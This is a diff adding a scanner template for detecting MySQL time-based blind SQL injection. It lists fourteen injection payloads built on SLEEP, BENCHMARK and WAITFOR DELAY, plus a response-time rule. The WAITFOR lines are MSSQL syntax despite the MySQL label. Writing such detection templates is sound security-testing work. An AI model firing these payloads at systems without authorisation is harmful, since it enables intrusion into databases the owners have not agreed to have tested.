@@ -1,0 +1,30 @@
+id: sqli-mysql-time-based
+name: "MySQL Time-Based Blind SQL Injection"
+category: sqli
+severity: high
+tags: [sqli, blind, time-based, mysql]
+author: "Quickfire"
+description: "Detects time-based blind SQL injection vulnerabilities in MySQL databases. Injects payloads that force the database to sleep or perform heavy computation (e.g., BENCHMARK), and measures the response time."
+injection_strategy: APPEND
+
+payloads:
+  - "' AND SLEEP(5) -- "
+  - " AND SLEEP(5) -- "
+  - "' AND '1'='1' AND SLEEP(5) -- "
+  - " AND '1'='1' AND SLEEP(5) -- "
+  - "' ; WAITFOR DELAY '00:00:05' -- "
+  - "; WAITFOR DELAY '00:00:05' -- "
+  - "'+BENCHMARK(7000000,SHA1(1))+'"
+  - "+BENCHMARK(7000000,SHA1(1))+"
+  - " AND 2=BENCHMARK(7000000,MD5('asd')) -- "
+  - "' AND 2=BENCHMARK(7000000,MD5('asd')) -- "
+  - "' OR ELT(1=1,SLEEP(5)) -- "
+  - " OR ELT(1=1,SLEEP(5)) -- "
+  - " AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() LIKE '%')#"
+  - "' AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() LIKE '%')#"
+
+detection:
+  baseline: false
+  rules:
+    - type: response_time
+      minMs: 4000
